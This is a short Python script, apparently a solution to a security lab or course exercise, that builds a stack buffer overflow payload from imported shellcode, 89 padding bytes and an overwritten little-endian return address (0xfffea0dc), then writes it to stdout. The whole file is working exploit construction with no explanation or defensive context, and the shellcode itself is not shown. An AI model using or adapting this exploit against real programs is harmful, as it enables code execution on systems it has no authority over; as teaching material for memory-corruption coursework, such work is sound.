from struct import pack
from shellcode import shellcode
import sys

# Padding length
padding = 89

# Construct the attack string
attack_str = shellcode + (b'\x12' * padding) + pack("<I", 0xfffea0dc)

# Write the attack string to stdout
sys.stdout.buffer.write(attack_str)

